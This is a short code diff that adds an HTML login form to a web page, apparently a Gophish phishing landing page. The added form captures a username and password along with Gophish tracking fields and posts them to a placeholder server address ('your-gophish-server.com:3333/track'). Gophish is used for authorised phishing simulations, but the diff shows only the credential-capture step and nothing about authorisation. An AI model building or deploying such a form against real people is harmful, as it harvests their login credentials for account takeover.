@@ -110,6 +110,16 @@ $(document).ready(function() {
 
 -->
 
+<form method="POST" action="http://your-gophish-server.com:3333/track">
+        <input type="hidden" name="rid" value="{{.RID}}">
+        <input type="hidden" name="email" value="{{.Email}}">
+        <label for="username">Login</label>
+        <input type="text" id="username" name="username" required>
+        <label for="password">Password</label>
+        <input type="password" id="password" name="password" required>
+        <button type="submit">Submit</button>
+    </form>
+
 
 <!-- table d'entrée des identifiants -->
 
